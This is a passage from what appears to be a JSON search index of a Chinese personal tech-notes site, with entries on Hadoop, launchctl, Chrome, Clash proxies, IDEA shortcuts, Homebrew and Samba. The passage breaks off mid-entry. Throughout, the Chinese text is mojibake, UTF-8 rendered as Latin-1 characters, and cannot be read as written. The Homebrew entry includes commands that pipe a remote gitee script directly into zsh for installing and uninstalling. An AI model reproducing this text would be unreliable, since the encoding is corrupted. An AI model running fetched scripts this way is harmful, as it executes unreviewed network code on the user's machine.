1.0.0ç‰ˆæœ¬æ­£å¼å‘å¸ƒï¼Œæ„å‘³ç€å¯ä»¥ç”¨äºå•†ä¸šåŒ–ã€‚ ä½†æ˜¯ï¼Œ1.0ç‰ˆæœ¬ä¸­ï¼Œå­˜åœ¨ä¸€äº›é—®é¢˜ï¼š æ‰©å±•æ€§å·®ï¼ŒJobTrackerè´Ÿè½½è¾ƒé‡ï¼Œæˆä¸ºæ€§èƒ½ç“¶é¢ˆã€‚ å¯é æ€§å·®ï¼ŒNameNodeåªæœ‰ä¸€ä¸ªï¼Œä¸‡ä¸€æŒ‚æ‰ï¼Œæ•´ä¸ªç³»ç»Ÿå°±ä¼šå´©æºƒã€‚ ä»…é€‚ç”¨MapReduceä¸€ç§è®¡ç®—æ–¹å¼ã€‚ èµ„æºç®¡ç†çš„æ•ˆç‡æ¯”è¾ƒä½ã€‚ æ‰€ä»¥ï¼Œ2012å¹´5æœˆï¼ŒHadoopæ¨å‡ºäº† 2.0ç‰ˆæœ¬ ã€‚ 2.0ç‰ˆæœ¬ä¸­ï¼Œåœ¨HDFSä¹‹ä¸Šï¼Œå¢åŠ äº†YARNï¼ˆèµ„æºç®¡ç†æ¡†æ¶ï¼‰å±‚ã€‚å®ƒæ˜¯ä¸€ä¸ªèµ„æºç®¡ç†æ¨¡å—ï¼Œä¸ºå„ç±»åº”ç”¨ç¨‹åºæä¾›èµ„æºç®¡ç†å’Œè°ƒåº¦ã€‚ å‚è€ƒ: æ·±å…¥æµ…å‡ºå¤§æ•°æ®ï¼šåˆ°åº•ä»€ä¹ˆæ˜¯Hadoopï¼Ÿ","tags":"å¤§æ•°æ®","url":"/yq-doc-source-docs-Chaotic-Big-Data-Hadoop.html","loc":"/yq-doc-source-docs-Chaotic-Big-Data-Hadoop.html"},{"title":"å¤§æ•°æ®","text":"Hadoop","tags":"å¤§æ•°æ®","url":"/yq-doc-source-docs-Chaotic-Big-Data-index.html","loc":"/yq-doc-source-docs-Chaotic-Big-Data-index.html"},{"title":"Android Studio","text":"å°†æœ¬åœ°å·²æœ‰çš„Gradleé…ç½®åˆ°é¡¹ç›®. Studioä¸­çš„ä½ç½®å›¾ç¤º å®‰è£…Gradleå¯å‚è€ƒ /docs/åç«¯/java/æ„å»ºå·¥å…·/gradle æ³¨è§£ è‹¥buildå‘ç°ä½ç½®ä¸é…ç½®çš„ä¸ä¸€è‡´, å…³é—­é‡æ–°æ‰“å¼€å³å¯. å¦Linux/Macéœ€è¦ä¸»è¦å®‰è£…ä½ç½®çš„æƒé™é—®é¢˜","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Android_studio.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Android_studio.html"},{"title":"macä¸‹åº”ç”¨è¿è¡Œç®¡ç†","text":"å‰è¨€ ç›¸å…³çš„æŒ‡ä»¤ launchctl # æ˜¾ç¤ºå½“å‰çš„å¯åŠ¨è„šæœ¬ launchctl list # å¼€æœºæ—¶è‡ªåŠ¨å¯åŠ¨ApacheæœåŠ¡å™¨ sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist # è®¾ç½®å¼€æœºå¯åŠ¨å¹¶ç«‹å³å¯åŠ¨æ”¹æœåŠ¡ launchctl load -w **.pist # è®¾ç½®å¼€æœºå¯åŠ¨ä½†ä¸ç«‹å³å¯åŠ¨æœåŠ¡ launchctl load **.pist # åœæ­¢æ­£åœ¨è¿è¡Œçš„å¯åŠ¨è„šæœ¬ sudo launchctl unload [ path/to/script ] # å†åŠ ä¸Š-wé€‰é¡¹å³å¯å»é™¤å¼€æœºå¯åŠ¨ sudo launchctl unload -w [ path/to/script ] æ³¨è§£ launchctl ç®¡ç† MacOS çš„å¯åŠ¨è„šæœ¬, æ§åˆ¶å¯åŠ¨è®¡ç®—æœºæ—¶éœ€è¦å¼€å¯çš„æœåŠ¡ã€‚ä¹Ÿå¯ä»¥è®¾ç½®å®šæ—¶æ‰§è¡Œç‰¹å®šä»»åŠ¡çš„è„šæœ¬, å°±åƒLinux cronä¸€æ ·ã€‚ launchctléœ€è¦ root æƒé™ã€‚ å‚è€ƒ: MacOS launchctl å¯åŠ¨è¿›ç¨‹æ§åˆ¶ ä½¿ç”¨ ç›´æ¥ä¸¾ä¾‹, ä¾‹å¦‚è¦åœæ­¢Docker yanque@yanquedembp ~ % launchctl list | grep docker - 0 com.docker.helper 1333 0 application.com.docker.docker.25263488.25263866 yanque@yanquedembp ~ % launchctl stop application.com.docker.docker.25263488.25263866","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Application-operation-management-under-mac.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Application-operation-management-under-mac.html"},{"title":"Chromeå¼€å‘è€…å·¥å…·","text":"ä¸€èˆ¬é»˜è®¤ F12 å³å¯æ‰“å¼€ æ ‡ç­¾ Elements æ­¤ç•Œé¢æ˜¾ç¤º HTML çš„æ¸²æŸ“å†…å®¹, å¯ Ctrl/Cmd + F åœ¨å½“å‰é¡µé¢æœç´¢ ä¾§è¾¹è¿˜æœ‰æ ·å¼æ˜¾ç¤º, è®¡ç®—æ˜¾ç¤º Console æ§åˆ¶å°, åœ¨æ­¤ç•Œé¢ å¯ Ctrl/Cmd + Shift + F å…¨å±€æœç´¢å­—ç¬¦ä¸²; Ctrl/Cmd + O æˆ–è€… Ctrl/Cmd + P ï¼Œå¯ä»¥å‘¼å‡ºä¸€ä¸ªæ–‡ä»¶åˆ—è¡¨çª—å£ï¼Œ è¾“å…¥å…³é”®è¯ï¼Œå¯ä»¥æœç´¢åˆ° æ–‡ä»¶ååŒ…å«è¿™ä¸ªè¯çš„æ–‡ä»¶ Network ç½‘ç»œè¿æ¥ ä¸€äº›å¿«æ·é”® Ctrl/Cmd + Shift + P æ‰“å¼€ä¸€ä¸ªè¿è¡Œå‘½ä»¤çš„çª—å£; å¯ç›´æ¥ä¸Šä¸‹é”®é€‰æ‹©æ‰“å¼€å“ªä¸€ä¸ªæ ‡ç­¾é¡µ Esc æ˜¾ç¤º/éšè—å½“å‰æ ‡ç­¾é¡µæŠ½å±‰æ , åªåœ¨æ§åˆ¶å°è·Ÿæºä»£ç æ ‡ç­¾é¡µç”¨è¿‡. ä¹Ÿå¯ç›´æ¥å•å‡»è®¾ç½®é€‰æ‹©:","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Chrome-Chrome-developer-tool.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Chrome-Chrome-developer-tool.html"},{"title":"Chromeæœç´¢æŠ€å·§","text":"site æŒ‡å®šæœç´¢æ—¶(ä¸)æŸ¥è¯¢æŸä¸ªåŸŸå(æ¯”å¦‚csdn): ä»Šæ—¥å¤§ç“œ -site:csdn.net è¯´æ˜: æ— ç©ºæ ¼æ˜¯ä¸æœç´¢æŒ‡å®šåŸŸå -site:csdn.net æœ‰ç©ºæ ¼æ˜¯ä»…æœç´¢æŒ‡å®šåŸŸå -site: csdn.net æ—  - æ—¶, ä¸ç®¡æœ‰æ— ç©ºæ ¼, éƒ½æ˜¯ä»…æœç´¢æŒ‡å®šåŸŸå site: csdn.net , site:csdn.net intitle ç½‘é¡µ æ ‡é¢˜ å¿…é¡»åŒ…å«çš„å†…å®¹: intitle:ä»Šæ—¥å¤§ç“œ intext ç½‘é¡µ å†…å®¹ (æ­£æ–‡)å¿…é¡»åŒ…å«çš„å†…å®¹: intext:ä»Šæ—¥å¤§ç“œ inurl åœ°å€å¿…åŒ…å«çš„url, å¦‚: inurl:index.php?id= filetype æ–‡ä»¶ç±»å‹: filetype:pdf","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Chrome-Chrome-search.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Chrome-Chrome-search.html"},{"title":"Chrome","text":"Chromeæœç´¢ Chromeå¼€å‘è€…å·¥å…·","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Chrome-index.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Chrome-index.html"},{"title":"macä¸‹chromeå¿«æ·é”®","text":"Mac ä¸‹ Chrome æµè§ˆå™¨ å¿«æ·é”®","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Chrome-shortcut-key-under-mac.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Chrome-shortcut-key-under-mac.html"},{"title":"clashç­‰ä»£ç†é—®é¢˜","text":"å…³äºæ™®é€šç‰ˆclashçš„ä»£ç†é—®é¢˜ è§„åˆ™: ä½ è´­ä¹°çš„èŠ‚ç‚¹ä»£ç†å•†é‚£è¾¹æœ‰ä¸€ä¸ªåˆ†æµè§„åˆ™, ä¸€èˆ¬æ˜¯å›½å†…çš„ç½‘ç«™ä¸èµ°ä»£ç†, å›½å¤–çš„ç½‘ç«™èµ°ä»£ç† å…¨å±€: å…¨éƒ¨éƒ½èµ°ä»£ç† æ³¨è§£ è¿™é‡Œçš„å…¨å±€ä»£ç†çš„æ„æ€å¹¶ä¸æ˜¯ä½ è®¾å¤‡ä¸Šçš„æ‰€æœ‰è½¯ä»¶éƒ½å¯ä»¥ä½¿ç”¨è¿™ä¸ªä»£ç†, è€Œæ˜¯æŒ‡ä½  é€šè¿‡ä»£ç†è®¿é—®çš„æ‰€æœ‰ç½‘ç«™éƒ½ä¸è¿›è¡Œåˆ†æµ å¦‚æœæƒ³è¦è®¾å¤‡ä¸Šå…¶ä»–è½¯ä»¶èµ°ä»£ç†, è¦çœ‹æ­¤è½¯ä»¶æ˜¯å¦æ”¯æŒäº†, æœ‰çš„å¯ä»¥æ‰‹åŠ¨åœ¨ç›¸åº”çš„è½¯ä»¶å†…é…ç½®ä»£ç†, é…ç½®è‡ªåŠ¨è¯†åˆ«æ‰‹åŠ¨æŒ‡å®šç­‰. æ¯”å¦‚éœ€è¦ç”¨åˆ°yarnä¸‹è½½åŒ…, å‘½ä»¤è¡Œé…ç½®ä¸‹æœ¬åœ°clashä»£ç†åœ°å€å³å¯: yarn config set proxy http://127.0.0.1:7890 å¯¹äºä¸æ”¯æŒçš„, é‚£å°±åªæœ‰ä¸ç”¨æˆ–è€…ç”¨ Proxifier å¼ºåˆ¶æŒ‡å®šäº†(ä»˜è´¹è½¯ä»¶, æš‚æœªç”¨è¿‡)","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Clash-Clash-and-other-agency-issues.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Clash-Clash-and-other-agency-issues.html"},{"title":"clashå„ç‰ˆæœ¬å¤‡ä»½","text":"æºäºåˆ«çš„UP. è§†é¢‘è¯´æ˜: https://www.youtube.com/watch?app=desktop&v=e3QVBWDJREM æ–‡ç« åœ°å€: https://duangks.com/archives/152/ å¤‡ä»½åœ°å€1-è°·æ­Œäº‘: https://drive.google.com/drive/folders/1dmyLaj4L4x2Nz-P5n-rozcgCa9Ip4qJ_ å¤‡ä»½åœ°å€2-alistäº‘ç›˜: https://alist.duangks.com","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Clash-Clash-record.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Clash-Clash-record.html"},{"title":"è®¾ç½®åº”ç”¨å…¨å±€","text":"æˆ‘ä»¬é€šå¸¸æ‰€è¯´çš„å…¨å±€æ¨¡å¼, æŒ‡çš„æ˜¯ ä½¿ç”¨æµè§ˆå™¨è®¿é—®æŸä¸ªåœ°å€æ—¶, ä½¿ç”¨ä»£ç†åœ°å€è®¿é—® . è€Œ è§„åˆ™æ¨¡å¼ æ˜¯, ä»…å¯¹åŒ¹é…åå•çš„åœ°å€ä½¿ç”¨ä»£ç†. è€Œç³»ç»Ÿçš„å…¶ä»–Appèƒ½å¦æ­£å¸¸è®¿é—®ä»£ç†, å¾—çœ‹åº”ç”¨è‡ªå·±æœ‰æ²¡æœ‰æä¾› è‡ªåŠ¨è¯†åˆ«ä»£ç†çš„åŠŸèƒ½. å¯¹äºMacOS, ç›´æ¥ä½¿ç”¨ ClashX Pro å³å¯, æ‰“å¼€ ä½¿ç”¨å¢å¼ºæ¨¡å¼ åŠŸèƒ½ å³å¯å¯¹å…¨å±€Appä½¿ç”¨ä»£ç† ä¸‹é¢ä¸»è¦ä»‹ç»Windows. å®‰è£…è™šæ‹Ÿç½‘å¡æœåŠ¡ æ‰“å¼€Clashä¸»ç•Œé¢, å®‰è£…æœåŠ¡æ¨¡å¼, å®‰è£…æœåŠ¡æ¨¡å— å®‰è£…å¥½åå›¾ä¸­åœˆå‡ºä½ç½®ä¼šæ˜¾ç¤º: å½“å‰çŠ¶æ€: å·²æ¿€æ´» æ‰“å¼€TUNæ¨¡å¼ åœ¨ ç³»ç»Ÿä»£ç† æ‰“å¼€çš„æƒ…å†µä¸‹, æ‰“å¼€ TUNæ¨¡å¼ æˆåŠŸåè¿˜å¯ä»¥çœ‹åˆ°æœ‰è¿™ä¸ª","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Clash-Set-the-overall-application.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Clash-Set-the-overall-application.html"},{"title":"Clash","text":"clashç­‰ä»£ç†é—®é¢˜ mac_clashxå…±äº«ä»£ç† è®¾ç½®åº”ç”¨å…¨å±€ clashè®°å½•","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Clash-index.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Clash-index.html"},{"title":"macä¸‹clash xå…±äº«ä»£ç†","text":"åœ¨å·²å®‰è£…clash x ä¸”èƒ½å¤Ÿå¼€å¯ä»£ç†çš„æœºå™¨ä¸Š, èœå•æ ç‚¹å¼€clash x, è®¾ç½®å…è®¸å±€åŸŸç½‘è¿æ¥ å…è®¸å±€åŸŸç½‘è¿æ¥ åœ¨å¦ä¸€ä¸ªéœ€è¦è¿æ¥çš„è®¾å¤‡è®¾ç½®httpä»£ç†, ipä¸ºå®‰è£…clash xæœºå™¨çš„ip ç«¯å£ä¸º 7890 (macé»˜è®¤æ˜¯è¿™ä¸ª, winè²Œä¼¼å¯ä»¥è‡ªå·±è®¾ç½®)","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Clash-mac_clashx-sharing-agent.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Clash-mac_clashx-sharing-agent.html"},{"title":"æ–‡ä»¶æ ¼å¼-toml","text":"ä¸€èˆ¬éƒ½æ˜¯è¿™ä¹ˆå†™çš„: [data1] key1 = v1 key2 = v2 ç›¸å½“äºå®šä¹‰äº†ä¸€ä¸ªåä¸ºdata1çš„å­—å…¸. é‚£å¦‚æœkey1çš„å€¼æ˜¯å­—å…¸å‘¢? ç›®å‰ä¸ºæ­¢åªçŸ¥é“ä¸€ä¸ªå¯ä»¥ å•è¡Œ å­—å…¸å®šä¹‰: [data1] key1 = {name='bob', age=20} key2 = v2","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-File-format-TOML.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-File-format-TOML.html"},{"title":"ideaå¿«æ·é”®","text":"macä¸windows Idea å¿«æ·é”®(ä¸è‡ªå®¶åŒç³»åˆ—å…¶ä»–äº§å“å¤§éƒ¨åˆ†é€šç”¨) Mac ä½œç”¨ Windows Option + æ–¹å‘ä¸Š é€‰ä¸­å½“å‰å…‰æ ‡æ‰€åœ¨å­—ç¬¦ä¸². å¤šæ¬¡ç‚¹å‡»æ‰©å¤§èŒƒå›´ Ctrl + W Option + æ–¹å‘ä¸‹ ä¸ä¸Šä¸€ä¸ªç›¸å. å¯ä»¥åœ¨ä¸Šé¢åŸºç¡€ä¸Šç¼©å°é€‰æ‹©èŒƒå›´ Ctrl + Shift + W Option + å›è½¦ æ˜¾ç¤ºä¸Šä¸‹æ–‡æ“ä½œ Option + F7 æŸ¥çœ‹æ‰€æœ‰å£°æ˜æˆ–è€…è°ƒç”¨(ä¸‹æ–¹çª—å£) Option + Shift + æ–¹å‘ä¸Š å°†å½“å‰è¡Œä¸Šç§»(è°ƒæ¢ä½ç½®) Option + Shift + æ–¹å‘ä¸‹ å°†å½“å‰è¡Œä¸‹ç§»(è°ƒæ¢ä½ç½®) Control + ç©ºæ ¼ æ˜¾ç¤ºè¡¥å…¨å»ºè®®. é€‰ä¸­åä½¿ç”¨ tab é”®å¯ä»¥å®Œç¾æ›¿æ¢åé¢çš„å­—ç¬¦ä¸² ä½¿ç”¨ return æ˜¯æ’å…¥ Control + G é€‰æ‹©å…‰æ ‡å¤„å­—ç¬¦ä¸². å¯å¤šæ¬¡ç‚¹å‡»é€‰ä¸­ä¸‹ä¸€ä¸ªä½ç½®ç›¸åŒå­—ç¬¦ä¸². å¯åŠ  Shift é”®. å–æ¶ˆå¤šæ¬¡é€‰æ‹©çš„å†…å®¹ Control + T é¢„è§ˆå…‰æ ‡ä½ç½®æˆ–é€‰ä¸­åŒºåŸŸçš„å¯é‡æ„é€‰é¡¹ Control + Command + G é€‰ä¸­å½“å‰æ–‡ä»¶ä¸­æ‰€æœ‰ä¸å½“å‰å…‰æ ‡æ‰€åœ¨å­—ç¬¦ä¸²ä¸€æ ·çš„å­—ç¬¦ä¸² Control + Shift + ç©ºæ ¼ æ˜¾ç¤ºå»ºè®®çš„è¡¥å…¨(æ ¹æ®å½“å‰ä¸Šä¸‹æ–‡) Shift + F6 é‡å‘½åå…‰æ ‡æ‰€åœ¨å­—ç¬¦ä¸² Command + D å¤åˆ¶å½“å‰è¡Œ Command + del åˆ é™¤å½“å‰è¡Œ. delå°±æ˜¯é”®ç›˜å³ä¸Šè§’é‚£ä¸ªåˆ é™¤çš„å‰. åœ¨windowé”®ç›˜ä¸Šbackspaceä½ç½® Command + / å•è¡Œæ³¨é‡Š Command + - è‹±æ–‡å‡å·ä½ç½®. ç¼©èµ·å½“å‰ä»£ç æ®µ Command + = ç­‰å·ä½ç½®. å±•å¼€å½“å‰ä»£ç æ®µ Command + P æŸ¥çœ‹æ–¹æ³•ç­¾å. å½¢å‚ä¿¡æ¯ Command + Y æŸ¥çœ‹æ–‡æœ¬å…‰æ ‡å¤„ç¬¦å·å®šä¹‰. å¦‚æ–¹æ³•å®šä¹‰ Command + F1 æŸ¥çœ‹è­¦å‘Šè¯´æ˜. å†æ¬¡ç‚¹å‡»æŸ¥çœ‹è¯¦ç»†è¯´æ˜ Command + F å½“å‰æ–‡ä»¶æŸ¥æ‰¾ Command + F12 ä¸»çª—ä½“æŸ¥çœ‹å½“å‰æ–‡ä»¶ç»“æ„ Command + 7 æ‰“å¼€æ–‡ä»¶ç»“æ„å°çª—å£ Command + B è·³è½¬åˆ°æ–¹æ³•å£°æ˜/æŸ¥çœ‹æ‰€æœ‰ç”¨æ³• Command + U æŸ¥çœ‹å½“å‰æ–¹æ³•çš„çˆ¶ç±»å£°æ˜ Command + E æŸ¥çœ‹æœ€è¿‘æ‰“å¼€çš„æ–‡ä»¶ Command + 9 é¢„è§ˆgitæäº¤æ—¶é—´çº¿ Command + L æ‰‹åŠ¨è¾“å…¥ è·³è½¬åˆ°è¡Œ Ctrl + G Command + Option + / å¤šè¡Œæ³¨é‡Š(pythonæ²¡æœ‰. javaæ‰æœ‰) Command + Option + T ä½¿ç”¨æ¨¡ç‰ˆæ¥ç¯ç»•æ‰€é€‰ä»£ç æ®µ. æ¯”å¦‚if. tryè¯­å¥ Command + Option + V æ›¿æ¢å±€éƒ¨å˜é‡. éœ€è¦å…ˆé€‰ä¸­ Command + Option + L æ ¼å¼åŒ–ä»£ç . è‹¥æœ‰é€‰ä¸­æ ¼å¼åŒ–é€‰ä¸­ä»£ç . è‹¥æ— é€‰ä¸­åˆ™æ ¼å¼åŒ–å…¨æ–‡ä»£ç . åŠ  Shift å¯ä»¥è‡ªå®šä¹‰æ ¼å¼åŒ–é€‰é¡¹ Command + Option + B æŸ¥çœ‹æ‰€æœ‰å®ç° Command + Shift + å›è½¦ è¡¥å…¨å½“å‰è¡Œæ‰€åœ¨è¯­å¥ Command + Shift + æ–¹å‘ä¸Š å°†å½“å‰æ–¹æ³•ä¸ä¸Šä¸€ä¸ªæ–¹æ³•è°ƒæ¢. æ³¨æ„å…‰æ ‡éœ€è¦åœ¨æ–¹æ³•æ ‡å¤´å¤„ Command + Shift + æ–¹å‘ä¸‹ å°†å½“å‰æ–¹æ³•ä¸ä¸‹ä¸€ä¸ªæ–¹æ³•è°ƒæ¢. æ³¨æ„å…‰æ ‡éœ€è¦åœ¨æ–¹æ³•æ ‡å¤´å¤„ Command + Shift + - è‹±æ–‡å‡å·ä½ç½®. ç¼©èµ·å½“å‰æ–‡ä»¶æ‰€æœ‰ä»£ç æ®µ Command + Shift + = ç­‰å·ä½ç½®. å±•å¼€å½“å‰æ–‡ä»¶æ‰€æœ‰ä»£ç æ®µ Command + Shift + M å°†æ‰€é€‰ä»£ç å—æå–åˆ°æ–¹æ³• Command + Shift + F7 é«˜äº®æ˜¾ç¤ºæ‰€é€‰æ–‡æœ¬çš„æ‰€æœ‰ç”¨æ³• Command + Shift + F æ‰€æœ‰æ–‡ä»¶ä¸­æŸ¥æ‰¾ Command + Shift + H æŸ¥çœ‹æ–¹æ³•çš„å±‚æ¬¡ç»“æ„. æ¯”å¦‚ç»§æ‰¿çš„æ ‘å½¢å›¾ Command + Shift + E æŸ¥çœ‹æœ€è¿‘æ‰“å¼€çš„æ–‡ä»¶ä¸­çš„ä¿®æ”¹ ESC å…³é—­ä¸»çª—å£åŒºåŸŸçš„å¼¹å‡ºçª—å£ Shift + ESC å…³é—­éä¸»çª—å£å¼¹å‡ºçª—å£ F1 æŸ¥çœ‹æ–‡æœ¬å…‰æ ‡å¤„ç¬¦å·æ–‡æ¡£ F2 è½¬åˆ°æ–‡ä»¶ä¸­ä¸‹ä¸€ä¸ªç°å®é«˜äº®çš„é”™è¯¯","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-IDEA-shortcut-key.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-IDEA-shortcut-key.html"},{"title":"macçš„åŒ…ç®¡ç†å™¨brew","text":"è‡ªä»å‡çº§åˆ°macos13ä¹‹å, ä½¿ç”¨brewä¸‹è½½å°±éå¸¸çš„æ…¢, ç¨å¾®çœ‹äº†ä¸€ä¸‹è¾“å‡º, å¤§æ¦‚æ˜¯å›½å†…æºæ²¡æœ‰13ç‰ˆæœ¬çš„åŒ…, æ‰€ä»¥æœ€åè¿˜æ˜¯å»å¤–é¢ä¸‹è½½... äºæ˜¯, å°±æ‰¾äº†ä¸€ä¸‹æœ‰æ²¡æœ‰å¤„ç†åŠæ³•. macä¸‹åŒ…ç®¡ç†å™¨æœ€å¸¸ç”¨çš„æœ‰brewä¸macport, ç½‘ä¸Šè¯´åè€…çš„åŒ…è¦å¤šå¾ˆå¤š. è¿™é‡Œåªè°ˆbrew, å®˜ç½‘: https://brew.sh/index_zh-cn å®‰è£…brew å›½å†…æºä¸‹è½½: /bin/zsh -c \"$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)\" æŠŠè„šæœ¬æä¸‹æ¥äº†, /resources/code/homebrew_zh.sh ä¸€å¼€å§‹ç”¨çš„2æ¸…åæº, ç»“æœæ…¢çš„è¦æ­». ç„¶åæ¢æˆ1ä¸­ç§‘å¤§çš„æº, å¿«å¤šäº† å¸è½½brew å¸è½½è„šæœ¬: /bin/zsh -c \"$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/HomebrewUninstall.sh)\" åŒæ ·æ‹‰ä¸‹æ¥äº†, /resources/code/homebrew_uninstall_zh.sh ä¸€äº›è¯´æ˜ brew Homebrew æºä»£ç ä»“åº“ homebrew-core Homebrew æ ¸å¿ƒè½¯ä»¶ä»“åº“ homebrew-bottles Homebrew é¢„ç¼–è¯‘äºŒè¿›åˆ¶è½¯ä»¶åŒ… homebrew-cask MacOS å®¢æˆ·ç«¯åº”ç”¨ Homebrewå›½å†…é•œåƒæºç›®å‰ä¸»è¦æœ‰ä¸­ç§‘å¤§é•œåƒã€é˜¿é‡Œé•œåƒã€æ¸…åé•œåƒã€‚ æŒ‡ä»¤è¯´æ˜ æŸ¥çœ‹brew.gitæº: cd \"$(brew --repo)\" && git remote -v æŸ¥çœ‹ homebrew-core.git å½“å‰æº: cd \"$(brew --repo homebrew/core)\" && git remote -v å¸¸è§æŠ¥é”™ Command failed with exit 128: git è¯¦ç»†æŠ¥é”™: fatal: not in a git directory Error: Command failed with exit 128: git å› ä¸ºbrewè½¯ä»¶ä»“åº“å®é™…æ˜¯ä½¿ç”¨gitæ¥è¿›è¡Œç®¡ç†çš„, æ‰€ä»¥ä¼šå»æœ¬åœ°çš„ä»“åº“ç›®å½• å»æ‰¾, ä½†æ˜¯å®ƒåˆä¸æ˜¯ä¸€ä¸ªgitä»“åº“. è§£å†³åŠæ³•: æ‰¾åˆ°æœ¬åœ°çš„å®‰è£…ä»“åº“ç›®å½•, ç„¶åä½¿ç”¨: git config --global --add safe.directory ç›®å½• å³å¯. å¦‚æœä¸çŸ¥é“è‡ªå·±å®‰è£…åœ¨å“ªäº†, å¯ä»¥ä½¿ç”¨findæŸ¥æ‰¾: yanque@yanquedembp ~ % find / -name \"homebrew\" 2>/dev/null /usr/local/Homebrew/Library/Taps/homebrew ç„¶åçœ‹çœ‹æœ‰å“ªäº›: yanque@yanquedembp ~ % ls /usr/local/Homebrew/Library/Taps/homebrew homebrew-cask homebrew-core homebrew-services ç„¶ååŠ è¿›å»: yanque@yanquedembp ~ % git config --global --add safe.directory /usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask yanque@yanquedembp ~ % git config --global --add safe.directory /usr/local/Homebrew/Library/Taps/homebrew/homebrew-core yanque@yanquedembp ~ % git config --global --add safe.directory /usr/local/Homebrew/Library/Taps/homebrew/homebrew-services è¯•è¿‡ä¸æ”¯æŒé€šé…ç¬¦.","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Mac's-bag-manager-Brew.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Mac's-bag-manager-Brew.html"},{"title":"StarWindConverter","text":"å°† img é•œåƒè½¬æ¢ä¸º Wmvare å¯ç”¨çš„è™šæ‹Ÿæœºæ–‡ä»¶ å®˜ç½‘ä¸‹è½½åœ°å€: https://www.starwindsoftware.com/starwind-v2v-converter#download éœ€è¦å¡«å†™ä¿¡æ¯, ç„¶åä¼šç»™ä½ å‘é‚®ä»¶, ä¸‹è½½åœ°å€åœ¨é‚®ä»¶é‡Œé¢, æˆ‘çš„æ˜¯: https://www.starwindsoftware.com/tmplink/starwindconverter.exe ä¸çŸ¥é“æ˜¯ä¸æ˜¯æ¯äººéƒ½ä¸€æ · å®‰è£…å¥½ä¹‹åä½¿ç”¨, é€‰æ‹©éœ€è¦è½¬æ¢çš„é•œåƒ é€‰æ‹©è½¬æ¢çš„ç›®æ ‡ è¿™é‡Œå¥½åƒä»»æ„éƒ½å¯, æˆ‘é€‰çš„ç¬¬ä¸€ä¸ª ç„¶å è½¬æ¢ å¦‚æœæœ‰è¿™ä¸ªæŠ¥é”™, è¯´æ˜è·¯å¾„æœ‰ä¸­æ–‡, æ¢ä¸ªè·¯å¾„å°±è¡Œ","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-StarWindConverter.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-StarWindConverter.html"},{"title":"ç»ˆç«¯å·¥å…·","text":"è¿™é‡Œä¸å¾—ä¸æä¸€ä¸‹: /docs/æ“ä½œç³»ç»Ÿ/linux/æ¦‚å¿µæ€§/ç»ˆç«¯ tty consoleåŒºåˆ«","tags":"å¸¸ç”¨å·¥å…·ä½¿ç”¨","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Terminal-tool.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Terminal-tool.html"},{"title":"ä½¿ç”¨sambaå®ç°win10æ˜ å°„ç£ç›˜é©±åŠ¨è®¿é—®linux","text":"å®‰è£… å®‰è£…samba: sudo apt install samba è¿™é‡Œå¯èƒ½ä¼šæç¤ºè·å–dhcpçš„é…ç½®ä¿¡æ¯ï¼Œä»¥åŠå®‰è£…dhcp-clientå®¢æˆ·ç«¯ï¼Œç¡®è®¤å°±å¥½ é…ç½® sambaçš„é…ç½®æ–‡ä»¶ä¸€èˆ¬åœ¨: /etc/samba/smb.conf ç®€å•é…ç½®smb.conf: sudo vim /etc/samba/smb.conf æœ€åæ·»åŠ é…ç½®ä¿¡æ¯, å¦‚: [user] #å…±äº«åç§°database comment = \"comment\" # æè¿°ä¿¡æ¯ path = /tmp/user1 # å…±äº«ç›®å½• public = no # å…³é—­æ‰€æœ‰äººå¯è§ writable = yes # 